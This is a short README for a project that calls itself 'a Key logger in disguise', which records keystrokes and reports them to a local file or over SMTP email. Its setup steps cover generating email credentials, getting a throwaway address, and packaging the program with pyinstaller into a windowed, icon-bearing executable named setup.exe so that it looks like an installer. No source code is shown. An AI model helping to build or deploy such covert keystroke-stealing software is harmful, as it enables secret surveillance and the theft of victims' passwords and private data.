# KeyLogger
A Key logger in disguise. This app can report data via [local file, smtp/email]

#### **seting things up**
>
1.  uncomment the lines of code in `create_credentials.py` and generate your (credentials.ini)  
2.  checkout https://temp-mail.org/en for a mock email address (handy for dev purposes)
3.  create executable  
`pyinstaller --onefile --windowed --icon=".\resources\kl.ico" setup.py`
4.  run the `setup.exe`